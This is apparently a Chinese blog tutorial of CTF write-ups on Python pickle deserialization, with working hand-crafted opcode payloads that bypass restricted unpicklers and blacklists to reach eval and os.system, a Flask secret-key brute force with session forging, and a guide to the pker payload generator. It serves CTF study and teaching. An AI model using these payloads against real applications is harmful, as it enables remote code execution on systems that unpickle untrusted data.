<h2 id="CTF实战"><a href="#CTF实战" class="headerlink" title="CTF实战"></a>CTF实战</h2><h4 id="Code-Breaking-picklecode"><a href="#Code-Breaking-picklecode" class="headerlink" title="Code-Breaking:picklecode"></a>Code-Breaking:picklecode</h4><p>题目将pickle能够引入的模块限定为<code>builtins</code>，并且设置了子模块黑名单：<code>&#123;&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;&#125;</code>，于是我们能够<strong>直接</strong>利用的模块有：</p>
<ul>
<li><code>builtins</code>模块中，黑名单外的子模块。</li>
<li>已经<code>import</code>的模块：<code>io</code>、<code>builtins</code>（需要先利用<code>builtins</code>模块中的函数）</li>
</ul>
<p>黑名单中没有<code>getattr</code>，所以可以通过<code>getattr</code>获取<code>io</code>或<code>builtins</code>的子模块以及子模块的子模块:)，而<code>builtins</code>里有<code>eval、exec</code>等危险函数，即使在黑名单中，也可以通过<code>getattr</code>获得。pickle不能直接获取<code>builtins</code>一级模块，但可以通过<code>builtins.globals()</code>获得<code>builtins</code>；这样就可以执行任意代码了。payload为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;&quot;&quot;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;builtins&#x27;</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(g1</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">pickle.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#翻译成人可以看懂的(搞了几十分钟才翻译出来)</span></span><br><span class="line"><span class="comment"># builtins.getattr(builtins.getattr(builtins.dict,&#x27;get&#x27;)(builtins.globals(),&quot;builtins&quot;),&quot;eval&quot;)(&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>首先执行getattr获取eval函数，再执行eval函数，这实际上是两步，而我们常用<code>__reduce__</code>生成的序列化字符串，只能执行一个函数；所以这题只能搓opcode；这题更多细节可以看<a target="_blank" rel="noopener" href="https://tttang.com/archive/1294/#toc_django">p神</a></p>
<h4 id="高校战疫网络安全分享赛-webtmp"><a href="#高校战疫网络安全分享赛-webtmp" class="headerlink" title="高校战疫网络安全分享赛:webtmp"></a>高校战疫网络安全分享赛:webtmp</h4><p>限制：重写了<code>find_class</code>函数，只能生成<code>__main__</code>模块的pickle：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&#x27;__main__&#x27;</span>: <span class="comment"># 只允许__main__模块</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br></pre></td></tr></table></figure>

<p>此外，禁止了<code>b&#39;R&#39;</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pickle_data = request.form.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> base64.b64decode(pickle_data): </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No... I don\&#x27;t like R-things. No Rabits, Rats, Roosters or RCEs.&#x27;</span></span><br></pre></td></tr></table></figure>

<p>目标是覆盖secret中的验证，由于secret被主程序引入，是存在于<code>__main__</code>下的secret模块中的，所以可以直接覆盖掉，此时就成功绕过了限制：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">secret</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&quot;1&quot;</span></span><br><span class="line"><span class="string">S&quot;category&quot;</span></span><br><span class="line"><span class="string">S&quot;2&quot;</span></span><br><span class="line"><span class="string">db0(S&quot;1&quot;</span></span><br><span class="line"><span class="string">S&quot;2&quot;</span></span><br><span class="line"><span class="string">i__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>也就是修改secret中的内容，再修改Animal中的内容</p>
<h4 id="MTCTF-2022-easypickle"><a href="#MTCTF-2022-easypickle" class="headerlink" title="[MTCTF 2022]easypickle"></a>[MTCTF 2022]easypickle</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="number">2</span>).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;user&#x27;</span>):</span><br><span class="line">        session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;&#x27;</span>.join(random.choices(<span class="string">&quot;admin&quot;</span>, k=<span class="number">5</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello &#123;&#125;!&#x27;</span>.<span class="built_in">format</span>(session[<span class="string">&#x27;user&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;user&#x27;</span>) != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;&lt;script&gt;alert(&#x27;Access Denied&#x27;);window.location.href=&#x27;/&#x27;&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            a = base64.b64decode(session.get(<span class="string">&#x27;ser_data&#x27;</span>)).replace(<span class="string">b&quot;builtin&quot;</span>, <span class="string">b&quot;BuIltIn&quot;</span>).replace(<span class="string">b&quot;os&quot;</span>, <span class="string">b&quot;Os&quot;</span>).replace(<span class="string">b&quot;bytes&quot;</span>, <span class="string">b&quot;Bytes&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> a <span class="keyword">or</span> <span class="string">b&#x27;i&#x27;</span> <span class="keyword">in</span> a <span class="keyword">or</span> <span class="string">b&#x27;o&#x27;</span> <span class="keyword">in</span> a <span class="keyword">or</span> <span class="string">b&#x27;b&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">                <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;R i o b is forbidden&quot;</span>)</span><br><span class="line">            pickle.loads(base64.b64decode(session.get(<span class="string">&#x27;ser_data&#x27;</span>)))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>爆破出secret-key</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">file_path=<span class="string">&#x27;./key.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">99999</span>):</span><br><span class="line">        key = os.urandom(<span class="number">2</span>).<span class="built_in">hex</span>()</span><br><span class="line">        f.write(<span class="string">&quot;\&quot;&#123;&#125;\&quot;\n&quot;</span>.<span class="built_in">format</span>(key))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install flask-unsign</span><br><span class="line">flask-unsign --unsign --cookie <span class="string">&quot;eyJ1c2VyIjoiYWRuZGEifQ.ZcCoiA.4j5NXD8o0aO7M1_QlzclCXimORo&quot;</span> --wordlist key.txt</span><br><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&quot;23a2&quot;</span> -t <span class="string">&quot;&#123;&#x27;username&#x27;:&#x27;admin&#x27;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>这里主要看pickle</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a = base64.b64decode(session.get(<span class="string">&#x27;ser_data&#x27;</span>)).replace(<span class="string">b&quot;builtin&quot;</span>, <span class="string">b&quot;BuIltIn&quot;</span>).replace(<span class="string">b&quot;os&quot;</span>, <span class="string">b&quot;Os&quot;</span>).replace(<span class="string">b&quot;bytes&quot;</span>, <span class="string">b&quot;Bytes&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> a <span class="keyword">or</span> <span class="string">b&#x27;i&#x27;</span> <span class="keyword">in</span> a <span class="keyword">or</span> <span class="string">b&#x27;o&#x27;</span> <span class="keyword">in</span> a <span class="keyword">or</span> <span class="string">b&#x27;b&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;R i o b is forbidden&quot;</span>)</span><br><span class="line">    pickle.loads(base64.b64decode(session.get(<span class="string">&#x27;ser_data&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span></span><br></pre></td></tr></table></figure>

<p>算是逻辑漏洞吧</p>
<p>payload</p>
<p>非常巧妙；利用<code>replace(b&quot;os&quot;, b&quot;Os&quot;)</code>绕过对<code>o</code>操作码的限制；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(S&#x27;key1&#x27;\nS&#x27;val1&#x27;\ndS&#x27;vul&#x27;\n(cos\nsystem\nVcalc\nos.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>但是我感觉预期解的payload应该是下面两这种，利用<code>\81</code>操作码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__builtin__</span></span><br><span class="line"><span class="string">map</span></span><br><span class="line"><span class="string">p0</span></span><br><span class="line"><span class="string">0(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tp1</span></span><br><span class="line"><span class="string">0(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">g1</span></span><br><span class="line"><span class="string">tp2</span></span><br><span class="line"><span class="string">0g0</span></span><br><span class="line"><span class="string">g2</span></span><br><span class="line"><span class="string">\x81p3</span></span><br><span class="line"><span class="string">0c__builtin__</span></span><br><span class="line"><span class="string">bytes</span></span><br><span class="line"><span class="string">p4</span></span><br><span class="line"><span class="string">(g3</span></span><br><span class="line"><span class="string">t\x81.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"><span class="comment"># p0 __import__(&quot;builtins&quot;).map</span></span><br><span class="line"><span class="comment"># p1 (&#x27;whoami&#x27;,)</span></span><br><span class="line"><span class="comment"># p2 os.system,(&#x27;whoami&#x27;,)</span></span><br><span class="line"><span class="comment"># p3 __import__(&quot;builtins&quot;).map.__new__(__import__(&quot;builtins&quot;).map,os.system,(&#x27;whoami&#x27;,))</span></span><br><span class="line"><span class="comment"># p4 __import__(&quot;builtins&quot;).bytes</span></span><br><span class="line"><span class="comment"># . __import__(&quot;builtins&quot;).bytes.__new__(__import__(&quot;builtins&quot;).bytes,__import__(&quot;builtins&quot;).map.__new__(__import__(&quot;builtins&quot;).map,os.system,(&#x27;whoami&#x27;,)))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下面这种paylaod还必须当前文件导入<code>os</code>模块才行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;c__builtin__</span></span><br><span class="line"><span class="string">map</span></span><br><span class="line"><span class="string">p0</span></span><br><span class="line"><span class="string">0(S&#x27;os.system(&quot;whoami&quot;)&#x27;</span></span><br><span class="line"><span class="string">tp1</span></span><br><span class="line"><span class="string">0(c__builtin__</span></span><br><span class="line"><span class="string">exec</span></span><br><span class="line"><span class="string">g1</span></span><br><span class="line"><span class="string">tp2</span></span><br><span class="line"><span class="string">g0</span></span><br><span class="line"><span class="string">g2</span></span><br><span class="line"><span class="string">\x81p3</span></span><br><span class="line"><span class="string">0c__builtin__</span></span><br><span class="line"><span class="string">bytes</span></span><br><span class="line"><span class="string">p4</span></span><br><span class="line"><span class="string">0(g3</span></span><br><span class="line"><span class="string">tp3</span></span><br><span class="line"><span class="string">0g4</span></span><br><span class="line"><span class="string">g3</span></span><br><span class="line"><span class="string">\x81.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"><span class="comment">#__import__(&quot;builtins&quot;).bytes(__import__(&quot;builtins&quot;).map(__import__(&quot;builtins&quot;).exec,(&#x27;os.system(&quot;whoami&quot;)&#x27;,)))</span></span><br></pre></td></tr></table></figure>

<h2 id="pker使用说明"><a href="#pker使用说明" class="headerlink" title="pker使用说明"></a>pker使用说明</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ul>
<li>pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在<a target="_blank" rel="noopener" href="https://github.com/eddieivan01/pker%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E3%80%82">https://github.com/eddieivan01/pker下载源码。</a></li>
<li>使用pker，我们可以更方便地编写pickle opcode（生成pickle版本0的opcode）。</li>
<li>再次建议，在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。</li>
<li>此外，pker的实现用到了python的ast（抽象语法树）库，抽象语法树也是一个很重要东西，有兴趣的可以研究一下ast库和pker的源码，由于篇幅限制，这里不再叙述。</li>
</ul>
<p>具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。</p>
<h3 id="使用方法与示例"><a href="#使用方法与示例" class="headerlink" title="使用方法与示例"></a>使用方法与示例</h3><ol>
<li>pker中的针对pickle的特殊语法需要重点掌握（后文给出示例）</li>
<li>此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。</li>
<li>pker主要用到<code>GLOBAL、INST、OBJ</code>三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">以下module都可以是包含`.`的子module</span><br><span class="line">调用函数时，注意传入的参数类型要和示例一致</span><br><span class="line">对应的opcode会被生成，但并不与pker代码相互等价</span><br><span class="line"></span><br><span class="line">GLOBAL</span><br><span class="line">对应opcode：<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">获取module下的一个全局对象（没有<span class="keyword">import</span>的也可以，比如下面的os）：</span><br><span class="line">GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">输入：module,instance(<span class="built_in">callable</span>、module都是instance)  </span><br><span class="line"></span><br><span class="line">INST</span><br><span class="line">对应opcode：<span class="string">b&#x27;i&#x27;</span></span><br><span class="line">建立并入栈一个对象（可以执行一个函数）：</span><br><span class="line">INST(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>)  </span><br><span class="line">输入：module,<span class="built_in">callable</span>,para </span><br><span class="line"></span><br><span class="line">OBJ</span><br><span class="line">对应opcode：<span class="string">b&#x27;o&#x27;</span></span><br><span class="line">建立并入栈一个对象（传入的第一个参数为<span class="built_in">callable</span>，可以执行一个函数））：</span><br><span class="line">OBJ(GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>), <span class="string">&#x27;ls&#x27;</span>) </span><br><span class="line">输入：<span class="built_in">callable</span>,para</span><br><span class="line"></span><br><span class="line">xxx(xx,...)</span><br><span class="line">对应opcode：<span class="string">b&#x27;R&#x27;</span></span><br><span class="line">使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）</span><br><span class="line"></span><br><span class="line">li[<span class="number">0</span>]=<span class="number">321</span></span><br><span class="line">或</span><br><span class="line">globals_dic[<span class="string">&#x27;local_var&#x27;</span>]=<span class="string">&#x27;hello&#x27;</span></span><br><span class="line">对应opcode：<span class="string">b&#x27;s&#x27;</span></span><br><span class="line">更新列表或字典的某项的值</span><br><span class="line"></span><br><span class="line">xx.attr=<span class="number">123</span></span><br><span class="line">对应opcode：<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">对xx对象进行属性设置</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">对应opcode：<span class="string">b&#x27;0&#x27;</span></span><br><span class="line">出栈（作为pickle.loads函数的返回值）：</span><br><span class="line"><span class="keyword">return</span> xxx <span class="comment"># 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）</span></span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ol>
<li>由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。</li>
<li>pker解析<code>S</code>时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test=<span class="string">&quot;123&quot;</span></span><br><span class="line"><span class="keyword">return</span> test</span><br></pre></td></tr></table></figure>

<p>被解析为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&quot;S&#x27;123&#x27;\np0\n0g0\n.&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="pker：全局变量覆盖"><a href="#pker：全局变量覆盖" class="headerlink" title="pker：全局变量覆盖"></a>pker：全局变量覆盖</h4><ul>
<li>覆盖直接由执行文件引入的<code>secret</code>模块中的<code>name</code>与<code>category</code>变量：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">secret=GLOBAL(<span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;secret&#x27;</span>) </span><br><span class="line"><span class="comment"># python的执行文件被解析为__main__对象，secret在该对象从属下</span></span><br><span class="line">secret.name=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">secret.category=<span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>覆盖引入模块的变量：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">game = GLOBAL(<span class="string">&#x27;guess_game&#x27;</span>, <span class="string">&#x27;game&#x27;</span>)</span><br><span class="line">game.curr_ticket = <span class="string">&#x27;123&#x27;</span></span><br></pre></td></tr></table></figure>

<p>接下来会给出一些具体的基本操作的实例。</p>
<h4 id="pker：函数执行"><a href="#pker：函数执行" class="headerlink" title="pker：函数执行"></a>pker：函数执行</h4><ul>
<li>通过<code>b&#39;R&#39;</code>调用：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">system = GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">system(s) <span class="comment"># `b&#x27;R&#x27;`调用</span></span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<ul>
<li>通过<code>b&#39;i&#39;</code>调用：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INST(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>通过<code>b&#39;c&#39;</code>与<code>b&#39;o&#39;</code>调用：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OBJ(GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>), <span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>多参数调用函数</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INST(<span class="string">&#x27;[module]&#x27;</span>, <span class="string">&#x27;[callable]&#x27;</span>[, par0,par1...])</span><br><span class="line">OBJ(GLOBAL(<span class="string">&#x27;[module]&#x27;</span>, <span class="string">&#x27;[callable]&#x27;</span>)[, par0,par1...])</span><br></pre></td></tr></table></figure>

<h4 id="pker：实例化对象"><a href="#pker：实例化对象" class="headerlink" title="pker：实例化对象"></a>pker：实例化对象</h4><ul>
<li>实例化对象是一种特殊的函数执行</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">animal = INST(<span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;Animal&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> animal</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">animal = OBJ(GLOBAL(<span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;Animal&#x27;</span>), <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> animal</span><br></pre></td></tr></table></figure>

<ul>
<li>其中，python原文件中包含：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, category</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br></pre></td></tr></table></figure>

<ul>
<li>也可以先实例化再赋值：</li>
</ul>
